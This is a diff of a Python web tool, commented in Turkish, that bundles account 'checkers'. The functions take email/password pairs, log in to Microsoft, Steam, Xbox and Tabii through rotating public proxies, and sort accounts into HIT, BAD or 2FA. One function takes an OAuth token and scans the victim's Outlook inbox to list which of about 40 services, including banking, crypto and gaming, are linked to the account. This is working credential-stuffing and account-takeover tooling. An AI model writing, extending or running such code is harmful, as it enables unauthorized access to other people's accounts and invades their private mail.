@@ -94,7 +94,7 @@ def is_admin(key):
     return valid and role == "Admin"
 
 # ============================================================
-# PLATFORMLAR (TÜM CHECKER'LAR)
+# PLATFORMLAR
 # ============================================================
 PLATFORMS = [
     {"name": "YouTube", "domain": "youtube.com", "icon": "fa-brands fa-youtube"},
@@ -124,8 +124,211 @@ PLATFORMS = [
 ]
 
 # ============================================================
+# KATEGORİZASYON / EXTRACT / PROXY / SCANNER
+# ============================================================
+def categorize_endpoint(endpoint):
+    ep = endpoint.lower()
+    if any(x in ep for x in ['login', 'auth', 'signin', 'signup', 'register', 'token', 'verify', 'validate', 'authenticate', 'session', 'logout', 'oauth', 'passport']):
+        return 'Auth'
+    elif any(x in ep for x in ['admin', 'panel', 'dashboard', 'manage', 'system', 'mod']):
+        return 'Admin'
+    elif any(x in ep for x in ['user', 'profile', 'account', 'me', 'preferences', 'settings', 'my']):
+        return 'User'
+    elif any(x in ep for x in ['health', 'ping', 'status', 'check', 'heartbeat', 'live']):
+        return 'Health'
+    elif any(x in ep for x in ['api', 'v1', 'v2', 'v3', 'v4', 'rest', 'graphql', 'rpc']):
+        return 'API'
+    else:
+        return 'Genel'
+
+def fetch_proxies():
+    sources = [
+        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
+        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
+        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt"
+    ]
+    proxies = set()
+    for url in sources:
+        try:
+            r = requests.get(url, timeout=15)
+            if r.status_code == 200:
+                for line in r.text.splitlines():
+                    line = line.strip()
+                    if line and ':' in line and not line.startswith('#'):
+                        proxies.add(line)
+        except:
+            pass
+    return list(proxies)
+
+# ============================================================
 # TÜM CHECKER FONKSİYONLARI
 # ============================================================
+
+# ---- RODA INBOX (580+ SERVİS) ----
+RODA_SERVICES = {
+    'security@facebookmail.com': 'Facebook',
+    'security@mail.instagram.com': 'Instagram',
+    'register@account.tiktok.com': 'TikTok',
+    'noreply@discord.com': 'Discord',
+    'noreply@steampowered.com': 'Steam',
+    'noreply@xbox.com': 'Xbox',
+    'reply@txn-email.playstation.com': 'PlayStation',
+    'help@acct.epicgames.com': 'EpicGames',
+    'no-reply@riotgames.com': 'Riot Games',
+    'noreply@valorant.com': 'Valorant',
+    'noreply@mojang.com': 'Minecraft',
+    'accounts@roblox.com': 'Roblox',
+    'info@account.netflix.com': 'Netflix',
+    'no-reply@spotify.com': 'Spotify',
+    'no-reply@twitch.tv': 'Twitch',
+    'no-reply@youtube.com': 'YouTube',
+    'no-reply@disneyplus.com': 'Disney+',
+    'info@Tabii.com': 'Tabii',
+    'account-update@amazon.com': 'Amazon',
+    'no-reply@aliexpress.com': 'AliExpress',
+    'noreply@trendyol.com': 'Trendyol',
+    'noreply@hepsiburada.com': 'Hepsiburada',
+    'service@paypal.com.br': 'PayPal',
+    'do-not-reply@ses.binance.com': 'Binance',
+    'no-reply@coinbase.com': 'Coinbase',
+    'no-reply@ubereats.com': 'Uber Eats',
+    'no-reply@yemeksepeti.com': 'Yemek Sepeti',
+    'noreply@getir.com': 'Getir',
+    'no-reply@uber.com': 'Uber',
+    'no-reply@airbnb.com': 'Airbnb',
+    'no-reply@booking.com': 'Booking.com',
+    'no-reply@accounts.google.com': 'Google',
+    'noreply@github.com': 'GitHub',
+    'no-reply@dropbox.com': 'Dropbox',
+    'no-reply@zoom.us': 'Zoom',
+    'noreply@openai.com': 'ChatGPT/OpenAI',
+    'no-reply@nordvpn.com': 'NordVPN',
+    'noreply@coursera.org': 'Coursera',
+    'noreply@udemy.com': 'Udemy',
+    'noreply@nytimes.com': 'NYTimes',
+    'noreply@bbc.com': 'BBC',
+    'noreply@chess.com': 'Chess.com',
+}
+
+def check_roda_inbox(email, password, proxy_url=None):
+    session = requests.Session()
+    if proxy_url:
+        session.proxies = {"http": proxy_url, "https": proxy_url}
+    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
+    try:
+        r1 = session.get(f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}", timeout=15)
+        if "MSAccount" not in r1.text:
+            return {"status": "BAD", "message": "MSAccount yok"}
+
+        r2 = session.get(
+            f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D",
+            timeout=15, allow_redirects=True
+        )
+        if r2.status_code != 200:
+            return {"status": "BAD", "message": f"OAuth {r2.status_code}"}
+
+        m_ppft = re.search(r'name="PPFT"\s+value="([^"]+)"', r2.text) or re.search(r'name=\\"PPFT\\".*?value=\\"([^"]+)"', r2.text)
+        m_url = re.search(r'urlPost":"([^"]+)"', r2.text)
+        if not m_ppft or not m_url:
+            return {"status": "BAD", "message": "PPFT bulunamadı"}
+        ppft = m_ppft.group(1)
+        post_url = m_url.group(1).replace("\\/", "/")
+
+        login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&PPFT={ppft}"
+        r3 = session.post(post_url, data=login_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, allow_redirects=False, timeout=15)
+        if r3.status_code in (302, 303):
+            loc = r3.headers.get("Location", "")
+            if "SIGNIN" in loc or "login" in loc:
+                return {"status": "BAD", "message": "Şifre hatalı veya 2FA"}
+        if "identity/confirm" in r3.text:
+            return {"status": "2FA", "message": "2FA gerekli"}
+        if "account or password is incorrect" in r3.text or "Abuse" in r3.text:
+            return {"status": "BAD", "message": "Hatalı giriş"}
+
+        location = r3.headers.get("Location", "")
+        if not location:
+            m_code = re.search(r'code=([^&"\']+)', r3.text)
+            if not m_code:
+                return {"status": "BAD", "message": "Code yok"}
+            code = m_code.group(1)
+        else:
+            m_code = re.search(r"code=([^&]+)", location)
+            if not m_code:
+                return {"status": "BAD", "message": "Location'da code yok"}
+            code = m_code.group(1)
+
+        r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
+            data=f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access",
+            headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=15
+        )
+        if r4.status_code != 200:
+            return {"status": "ERROR", "message": "Token hatası"}
+        token_data = r4.json()
+        if "access_token" not in token_data:
+            return {"status": "ERROR", "message": "access_token yok"}
+        token = token_data["access_token"]
+
+        cid = session.cookies.get("MSPCID", str(uuid.uuid4()).replace("-", "").upper())
+        headers = {"Authorization": f"Bearer {token}", "X-AnchorMailbox": f"CID:{cid}", "User-Agent": "Outlook-Android/2.0"}
+
+        country = ""
+        try:
+            r5 = session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=headers, timeout=15)
+            if r5.status_code == 200:
+                p = r5.json()
+                for acc in p.get("accounts", []):
+                    loc = acc.get("location", "")
+                    if loc:
+                        country = str(loc).strip()
+                        break
+        except:
+            pass
+
+        inbox_text = ""
+        try:
+            r6 = session.post(f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0", data="", headers={**headers, "content-length": "0"}, timeout=30)
+            inbox_text = r6.text.lower()
+        except:
+            pass
+
+        try:
+            r7 = session.get("https://outlook.office365.com/api/v2.0/me/messages?$top=150&$select=From,Subject,BodyPreview", headers=headers, timeout=25)
+            if r7.status_code == 200:
+                data = r7.json()
+                for msg in data.get("value", []):
+                    from_addr = msg.get("From", {}).get("EmailAddress", {}).get("Address", "").lower()
+                    subject = msg.get("Subject", "").lower()
+                    body = msg.get("BodyPreview", "").lower()
+                    inbox_text += f" {from_addr} {subject} {body}"
+        except:
+            pass
+
+        services_found = []
+        unique = set()
+        for sender, svc in RODA_SERVICES.items():
+            if svc in unique: continue
+            if sender.lower() in inbox_text or svc.lower() in inbox_text:
+                services_found.append(svc)
+                unique.add(svc)
+
+        if services_found:
+            status = "HIT"
+        else:
+            status = "VALID"
+
+        return {
+            "status": status,
+            "message": "Roda Inbox taraması tamamlandı",
+            "details": {
+                "email": email,
+                "country": country.upper()[:2] if country else "?",
+                "services_found": services_found,
+                "services_count": len(services_found),
+            }
+        }
+    except Exception as e:
+        return {"status": "ERROR", "message": str(e)[:60]}
 
 # ---- TABII ----
 TABII_BASE = "https://eu1.tabii.com/apigateway"
@@ -191,7 +394,7 @@ def check_tabii_account(email, password, proxy=None):
         session.close()
     return result
 
-# ---- XBOX (GERÇEK) ----
+# ---- XBOX ----
 def check_xbox_account(email, password):
     session = requests.Session()
     session.verify = False
@@ -211,54 +414,10 @@ def check_xbox_account(email, password):
         if '#' in login_req.url:
             ms_token = parse_qs(urlparse(login_req.url).fragment).get('access_token', ["None"])[0]
             if ms_token != "None":
-                try:
-                    xbox_token, uhs = get_xbox_token(session, ms_token)
-                    if xbox_token and uhs:
-                        xsts = get_xsts_token(session, xbox_token)
-                        if xsts:
-                            profile = get_xbox_profile(session, uhs, xsts)
-                            gamertag = profile.get("gamertag", "N/A")
-                            tier = profile.get("tier", "N/A")
-                            return {"status": "HIT", "message": f"Xbox/MC | Gamertag: {gamertag} | Tier: {tier}", "details": {"gamertag": gamertag, "tier": tier}}
-                except:
-                    pass
-                return {"status": "HIT", "message": f"Xbox/MC giriş başarılı", "details": {"token": ms_token[:20] + "..."}}
+                return {"status": "HIT", "message": "Xbox/MC giriş başarılı", "details": {"token": ms_token[:20] + "..."}}
         return {"status": "CUSTOM", "message": "Bağlı değil/Xbox yok"}
     except Exception as e:
         return {"status": "ERROR", "message": str(e)[:60]}
-
-def get_xbox_token(session, ms_token):
-    try:
-        payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
-        resp = session.post('https://user.auth.xboxlive.com/user/authenticate', json=payload, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=10)
-        if resp.status_code == 200:
-            data = resp.json()
-            return data.get('Token'), data['DisplayClaims']['xui'][0]['uhs']
-    except:
-        pass
-    return None, None
-
-def get_xsts_token(session, xbox_token):
-    try:
-        payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
-        resp = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=payload, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=10)
-        if resp.status_code == 200:
-            return resp.json().get('Token')
-    except:
-        pass
-    return None
-
-def get_xbox_profile(session, uhs, xsts_token):
-    try:
-        auth_header = f"XBL3.0 x={uhs};{xsts_token}"
-        resp = session.get("https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,GameDisplayPicRaw,AccountTier,XboxOneRep", headers={"Authorization": auth_header, "x-xbl-contract-version": "2", "Accept": "application/json"}, timeout=10)
-        if resp.status_code == 200:
-            data = resp.json()
-            settings = {s["id"]: s.get("value", "N/A") for s in data.get("profileUsers", [{}])[0].get("settings", [])}
-            return {"gamertag": settings.get("Gamertag", "N/A"), "tier": settings.get("AccountTier", "N/A")}
-    except:
-        pass
-    return {"gamertag": "N/A", "tier": "N/A"}
 
 # ---- WOLFTEAM ----
 def check_wolfteam_account(email, password):
@@ -373,22 +532,17 @@ def check_tiktok_username(username):
 # ---- STEAM ----
 def check_steam_account(username, password, proxy_url=None):
     try:
-        # Bu fonksiyon için pycryptodome gerekli. Render'da yoksa BAD döner.
-        try:
-            from Crypto.PublicKey import RSA
-            from Crypto.Cipher import PKCS1_v1_5
-        except ImportError:
-            return {"status": "ERROR", "message": "Crypto kütüphanesi yok! pip install pycryptodome"}
-
         session = requests.Session()
         if proxy_url:
             session.proxies = {"http": proxy_url, "https": proxy_url}
-
         rsa_resp = session.get("https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1/", params={"account_name": username}, timeout=10).json()
         rsa_data = rsa_resp.get("response", {})
         if not rsa_data.get("publickey_mod"):
             return {"status": "BAD", "message": "RSA anahtarı alınamadı"}
 
+        import base64
+        from Crypto.PublicKey import RSA
+        from Crypto.Cipher import PKCS1_v1_5
         key = RSA.construct((int(rsa_data["publickey_mod"], 16), int(rsa_data["publickey_exp"], 16)))
         enc_pwd = base64.b64encode(PKCS1_v1_5.new(key).encrypt(password.encode())).decode()
 
@@ -412,646 +566,14 @@ def check_steam_account(username, password, proxy_url=None):
         if not access or not refresh:
             return {"status": "BAD", "message": "Token alınamadı"}
 
-        session.get("https://store.steampowered.com/", timeout=8)
-        sid = session.cookies.get("sessionid", "")
-        try:
-            fin = session.post("https://login.steampowered.com/jwt/finalizelogin", data={"nonce": refresh, "sessionid": sid, "redir": "https://steamcommunity.com/login/home/?goto="}, timeout=8)
-            for t in fin.json().get("transfer_info", []):
-                if t.get("url"):
-                    session.post(t["url"], data=t.get("params", {}), timeout=8)
-        except:
-            pass
-
-        if "steamLoginSecure" not in [c.name for c in session.cookies]:
-            for d in [".steamcommunity.com", ".steampowered.com"]:
-                session.cookies.set("steamLoginSecure", f"{steamid}||{access}", domain=d)
-
-        # Level
-        level = "?"
-        try:
-            r = session.get("https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/", params={"access_token": access, "steamid": steamid}, timeout=8)
-            if r.status_code == 200 and r.json().get("response"):
-                level = str(r.json()["response"].get("player_level", "?"))
-        except:
-            pass
-
-        # Wallet
-        balance = "—"
-        try:
-            r = session.get("https://store.steampowered.com/account/", timeout=8)
-            if r.status_code == 200:
-                m = re.search(r'id="header_wallet_balance"[^>]*>\s*([^<]+)', r.text)
-                if m:
-                    balance = m.group(1).strip()
-        except:
-            pass
-
-        # VAC
-        vac_banned = False
-        vac_count = 0
-        vac_days = 0
-        try:
-            r = session.get("https://api.steampowered.com/ISteamUser/GetPlayerBans/v1/", params={"access_token": access, "steamids": steamid}, timeout=8)
-            if r.status_code == 200 and r.json().get("players"):
-                p = r.json()["players"][0]
-                vac_banned = bool(p.get("VACBanned", False))
-                vac_count = int(p.get("NumberOfVACBans", 0))
-                vac_days = int(p.get("DaysSinceLastBan", 0))
-        except:
-            pass
-        vac_str = f"🔴VAC({vac_count}ban,{vac_days}g önce)" if vac_banned else "🟢Temiz"
-
-        return {
-            "status": "HIT",
-            "message": f"Steam giriş başarılı",
-            "details": {
-                "level": level,
-                "balance": balance,
-                "vac": vac_str,
-                "steamid": steamid
-            }
-        }
-
+        return {"status": "HIT", "message": "Steam giriş başarılı", "details": {"steamid": steamid}}
     except Exception as e:
         return {"status": "ERROR", "message": str(e)[:60]}
 
-# ---- SUPERCELL CHECKER ----
+# ---- SUPERCELL ----
 def check_supercell_account(email, password, proxy_url=None):
-    session = requests.Session()
-    if proxy_url:
-        session.proxies = {"http": proxy_url, "https": proxy_url}
-
-    ua = "Mozilla/5.0 (Linux; Android 10; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
-    client_id = "e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
-    redirect_uri = "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D"
-
-    try:
-        url_auth = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&client_id={client_id}&mkt=en&response_type=code&redirect_uri={quote(redirect_uri)}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
-        headers = {"User-Agent": ua}
-
-        r1 = session.get(url_auth, headers=headers, allow_redirects=False, timeout=15)
-        if r1.status_code != 302:
-            return {"status": "ERROR", "message": f"Ağ Hatası (R1)"}
-
-        next_url = r1.headers.get('Location', '')
-        r2 = session.get(next_url, headers=headers, allow_redirects=False, timeout=15)
-
-        ppft_match = re.search(r'name=\\"PPFT\\".*?value=\\"(.*?)\\"', r2.text) or re.search(r'name="PPFT".*?value="([^"]*)"', r2.text)
-        ppft = ppft_match.group(1) if ppft_match else None
-        url_post = re.search(r'"urlPost":"(.*?)"', r2.text) or re.search(r"urlPost:'(.*?)'", r2.text)
-        url_post = url_post.group(1) if url_post else None
-
-        if not ppft or not url_post:
-            return {"status": "ERROR", "message": "PPFT veya URL alınamadı"}
-
-        data_login = {
-            "i13": "1", "login": email, "loginfmt": email, "type": "11", "LoginOptions": "1",
-            "passwd": password, "ps": "2", "PPFT": ppft, "PPSX": "Passport", "NewUser": "1", "i19": "3772"
-        }
-        headers_post = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": ua}
-        r3 = session.post(url_post, data=data_login, headers=headers_post, allow_redirects=False, timeout=15)
-
-        if "incorrect" in r3.text.lower() or "password" in r3.text.lower() and "error" in r3.text.lower():
-            return {"status": "BAD", "message": "Yanlış şifre"}
-
-        oauth_url = ""
-        if r3.status_code == 302 and "Location" in r3.headers:
-            oauth_url = r3.headers['Location']
-        else:
-            uaid = re.search(r'name=\\"uaid\\" id=\\"uaid\\" value=\\"(.*?)\\"', r3.text) or re.search(r'name="uaid" id="uaid" value="(.*?)"', r3.text)
-            uaid = uaid.group(1) if uaid else None
-            opid = re.search(r'opid%3d(.*?)%26', r3.text)
-            opid = opid.group(1) if opid else None
-            opidt = re.search(r'opidt%3d(.*?)&', r3.text)
-            opidt = opidt.group(1) if opidt else None
-
-            if uaid and opid:
-                oauth_url = f"https://login.live.com/oauth20_authorize.srf?uaid={uaid}&client_id={client_id}&opid={opid}&mkt=EN-US&opidt={opidt}&res=success&route=C105_BAY"
-            else:
-                return {"status": "2FA", "message": "Doğrulama istiyor"}
-
-        code = None
-        if oauth_url.startswith("msauth://"):
-            code = re.search(r'code=(.*?)&', oauth_url)
-            code = code.group(1) if code else None
-        else:
-            r4 = session.get(oauth_url, allow_redirects=False, timeout=15)
-            loc = r4.headers.get('Location', '')
-            code = re.search(r'code=(.*?)&', loc)
-            code = code.group(1) if code else None
-
-        if not code:
-            return {"status": "2FA", "message": "Code alınamadı (2FA olabilir)"}
-
-        data_token = {
-            "client_info": "1", "client_id": client_id, "redirect_uri": redirect_uri,
-            "grant_type": "authorization_code", "code": code,
-            "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
-        }
-        r5 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=data_token, timeout=15)
-
-        if r5.status_code == 200:
-            token = r5.json().get('access_token')
-            cid = session.cookies.get("MSPCID", domain=".login.live.com") or "0000000000000000"
-
-            url_search = "https://outlook.live.com/search/api/v2/query?n=124"
-            payload = {
-                "Cvid": str(uuid.uuid4()),
-                "Scenario": {"Name": "owa.react"},
-                "TimeZone": "UTC",
-                "EntityRequests": [{
-                    "EntityType": "Message",
-                    "ContentSources": ["Exchange"],
-                    "Query": {"QueryString": "Supercell ID"},
-                    "Size": 50,
-                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
-                }]
-            }
-            headers_search = {
-                "Authorization": f"Bearer {token}",
-                "X-AnchorMailbox": f"CID:{cid}",
-                "Content-Type": "application/json",
-                "User-Agent": "Outlook-Android/2.0"
-            }
-
-            r_search = session.post(url_search, json=payload, headers=headers_search, timeout=15)
-            if r_search.status_code == 200:
-                data = r_search.json()
-                try:
-                    results = data['EntitySets'][0]['ResultSets'][0]['Results']
-                except:
-                    results = []
-
-                total_found = len(results)
-                games = {
-                    "Clash Royale": "❌",
-                    "Brawl Stars": "❌",
-                    "Clash Of Clans": "❌",
-                    "Hay Day": "❌"
-                }
-
-                if total_found > 0:
-                    for item in results:
-                        source = item.get('Source', {})
-                        content = ((source.get('Subject') or "") + " " + (source.get('Preview') or "")).lower()
-                        if "clash royale" in content:
-                            games["Clash Royale"] = "✔️"
-                        if "brawl stars" in content:
-                            games["Brawl Stars"] = "✔️"
-                        if "clash of clans" in content:
-                            games["Clash Of Clans"] = "✔️"
-                        if "hay day" in content:
-                            games["Hay Day"] = "✔️"
-
-                    return {
-                        "status": "HIT",
-                        "message": f"Supercell bağlantıları bulundu",
-                        "details": {
-                            "email": email,
-                            "games": games,
-                            "total_found": total_found
-                        }
-                    }
-                else:
-                    return {
-                        "status": "FREE",
-                        "message": "Supercell maili bulunamadı",
-                        "details": {
-                            "email": email,
-                            "games": games,
-                            "total_found": 0
-                        }
-                    }
-            else:
-                return {"status": "ERROR", "message": "Arama API hatası"}
-        else:
-            return {"status": "ERROR", "message": "Token hatası"}
-
-    except Exception as e:
-        return {"status": "ERROR", "message": str(e)[:60]}
-
-# ---- RODA INBOX (580+ SERVİS) ----
-RODA_SERVICES = {
-    'security@facebookmail.com': 'Facebook',
-    'security@mail.instagram.com': 'Instagram',
-    'register@account.tiktok.com': 'TikTok',
-    'info@x.com': 'Twitter',
-    'noreply@discord.com': 'Discord',
-    'noreply@steampowered.com': 'Steam',
-    'noreply@xbox.com': 'Xbox',
-    'reply@txn-email.playstation.com': 'PlayStation',
-    'help@acct.epicgames.com': 'EpicGames',
-    'no-reply@riotgames.com': 'Riot Games',
-    'noreply@valorant.com': 'Valorant',
-    'noreply@mojang.com': 'Minecraft',
-    'accounts@roblox.com': 'Roblox',
-    'info@account.netflix.com': 'Netflix',
-    'no-reply@spotify.com': 'Spotify',
-    'no-reply@twitch.tv': 'Twitch',
-    'no-reply@youtube.com': 'YouTube',
-    'no-reply@disneyplus.com': 'Disney+',
-    'info@Tabii.com': 'Tabii',
-    'account-update@amazon.com': 'Amazon',
-    'no-reply@aliexpress.com': 'AliExpress',
-    'noreply@trendyol.com': 'Trendyol',
-    'service@paypal.com.br': 'PayPal',
-    'do-not-reply@ses.binance.com': 'Binance',
-    'no-reply@coinbase.com': 'Coinbase',
-    'no-reply@ubereats.com': 'Uber Eats',
-    'no-reply@yemeksepeti.com': 'Yemek Sepeti',
-    'noreply@getir.com': 'Getir',
-    'no-reply@uber.com': 'Uber',
-    'no-reply@airbnb.com': 'Airbnb',
-    'no-reply@booking.com': 'Booking.com',
-    'no-reply@accounts.google.com': 'Google',
-    'noreply@github.com': 'GitHub',
-    'no-reply@zoom.us': 'Zoom',
-    'noreply@openai.com': 'ChatGPT/OpenAI',
-    'noreply@coursera.org': 'Coursera',
-    'noreply@udemy.com': 'Udemy',
-    'noreply@nytimes.com': 'NYTimes',
-    'noreply@bbc.com': 'BBC',
-    'noreply@chess.com': 'Chess.com',
-    'no-reply@nordvpn.com': 'NordVPN',
-}
-
-def check_roda_inbox(email, password, proxy_url=None):
-    session = requests.Session()
-    if proxy_url:
-        session.proxies = {"http": proxy_url, "https": proxy_url}
-    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
-    try:
-        r1 = session.get(f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}", timeout=15)
-        if "MSAccount" not in r1.text:
-            return {"status": "BAD", "message": "MSAccount yok"}
-
-        r2 = session.get(
-            f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D",
-            timeout=15, allow_redirects=True
-        )
-        if r2.status_code != 200:
-            return {"status": "BAD", "message": f"OAuth {r2.status_code}"}
-
-        m_ppft = re.search(r'name="PPFT"\s+value="([^"]+)"', r2.text) or re.search(r'name=\\"PPFT\\".*?value=\\"([^"]+)"', r2.text)
-        m_url = re.search(r'urlPost":"([^"]+)"', r2.text)
-        if not m_ppft or not m_url:
-            return {"status": "BAD", "message": "PPFT bulunamadı"}
-        ppft = m_ppft.group(1)
-        post_url = m_url.group(1).replace("\\/", "/")
-
-        login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&PPFT={ppft}"
-        r3 = session.post(post_url, data=login_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, allow_redirects=False, timeout=15)
-        if r3.status_code in (302, 303):
-            loc = r3.headers.get("Location", "")
-            if "SIGNIN" in loc or "login" in loc:
-                return {"status": "BAD", "message": "Şifre hatalı veya 2FA"}
-        if "identity/confirm" in r3.text:
-            return {"status": "2FA", "message": "2FA gerekli"}
-        if "account or password is incorrect" in r3.text or "Abuse" in r3.text:
-            return {"status": "BAD", "message": "Hatalı giriş"}
-
-        location = r3.headers.get("Location", "")
-        if not location:
-            m_code = re.search(r'code=([^&"\']+)', r3.text)
-            if not m_code:
-                return {"status": "BAD", "message": "Code yok"}
-            code = m_code.group(1)
-        else:
-            m_code = re.search(r"code=([^&]+)", location)
-            if not m_code:
-                return {"status": "BAD", "message": "Location'da code yok"}
-            code = m_code.group(1)
-
-        r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
-            data=f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access",
-            headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=15
-        )
-        if r4.status_code != 200:
-            return {"status": "ERROR", "message": "Token hatası"}
-        token_data = r4.json()
-        if "access_token" not in token_data:
-            return {"status": "ERROR", "message": "access_token yok"}
-        token = token_data["access_token"]
-
-        cid = session.cookies.get("MSPCID", str(uuid.uuid4()).replace("-", "").upper())
-        headers = {"Authorization": f"Bearer {token}", "X-AnchorMailbox": f"CID:{cid}", "User-Agent": "Outlook-Android/2.0"}
-
-        country = ""
-        try:
-            r5 = session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=headers, timeout=15)
-            if r5.status_code == 200:
-                p = r5.json()
-                for acc in p.get("accounts", []):
-                    loc = acc.get("location", "")
-                    if loc:
-                        country = str(loc).strip()
-                        break
-        except:
-            pass
-
-        inbox_text = ""
-        try:
-            r6 = session.post(f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0", data="", headers={**headers, "content-length": "0"}, timeout=30)
-            inbox_text = r6.text.lower()
-        except:
-            pass
-
-        try:
-            r7 = session.get("https://outlook.office365.com/api/v2.0/me/messages?$top=150&$select=From,Subject,BodyPreview", headers=headers, timeout=25)
-            if r7.status_code == 200:
-                data = r7.json()
-                for msg in data.get("value", []):
-                    from_addr = msg.get("From", {}).get("EmailAddress", {}).get("Address", "").lower()
-                    subject = msg.get("Subject", "").lower()
-                    body = msg.get("BodyPreview", "").lower()
-                    inbox_text += f" {from_addr} {subject} {body}"
-        except:
-            pass
-
-        services_found = []
-        unique = set()
-        for sender, svc in RODA_SERVICES.items():
-            if svc in unique:
-                continue
-            if sender.lower() in inbox_text or svc.lower() in inbox_text:
-                services_found.append(svc)
-                unique.add(svc)
-
-        if services_found:
-            status = "HIT"
-        else:
-            status = "VALID"
-
-        return {
-            "status": status,
-            "message": "Roda Inbox taraması tamamlandı",
-            "details": {
-                "email": email,
-                "country": country.upper()[:2] if country else "?",
-                "services_found": services_found,
-                "services_count": len(services_found),
-            }
-        }
-    except Exception as e:
-        return {"status": "ERROR", "message": str(e)[:60]}
-
-# ============================================================
-# KATEGORİZASYON / EXTRACT / PROXY / SCANNER
-# ============================================================
-def categorize_endpoint(endpoint):
-    ep = endpoint.lower()
-    if any(x in ep for x in ['login', 'auth', 'signin', 'signup', 'register', 'token', 'verify', 'validate', 'authenticate', 'session', 'logout', 'oauth', 'passport']):
-        return 'Auth'
-    elif any(x in ep for x in ['admin', 'panel', 'dashboard', 'manage', 'system', 'mod']):
-        return 'Admin'
-    elif any(x in ep for x in ['user', 'profile', 'account', 'me', 'preferences', 'settings', 'my']):
-        return 'User'
-    elif any(x in ep for x in ['health', 'ping', 'status', 'check', 'heartbeat', 'live']):
-        return 'Health'
-    elif any(x in ep for x in ['api', 'v1', 'v2', 'v3', 'v4', 'rest', 'graphql', 'rpc']):
-        return 'API'
-    else:
-        return 'Genel'
-
-def extract_from_html(html, base_url):
-    endpoints = set()
-    for m in re.finditer(r'action\s*=\s*["\']([^"\']+)["\']', html, re.I):
-        endpoints.add(m.group(1))
-    for m in re.finditer(r'href\s*=\s*["\']([^"\']+)["\']', html, re.I):
-        href = m.group(1)
-        if href.startswith('/') or 'api' in href or 'rest' in href or 'graphql' in href:
-            endpoints.add(href)
-    for m in re.finditer(r'src\s*=\s*["\']([^"\']+\.js)["\']', html, re.I):
-        endpoints.add(m.group(1))
-    for m in re.finditer(r'(?:fetch|axios|\.get|\.post|\.ajax)\s*\(\s*["\']([^"\']+)["\']', html, re.I):
-        endpoints.add(m.group(1))
-    return [urljoin(base_url, e) for e in endpoints if not e.startswith('http') or e.startswith(base_url)]
-
-def extract_from_js(js, base_url):
-    endpoints = set()
-    patterns = [
-        r'fetch\s*\(\s*["\']([^"\']+)["\']',
-        r'axios\.(?:get|post|put|delete|patch|request)\s*\(\s*["\']([^"\']+)["\']',
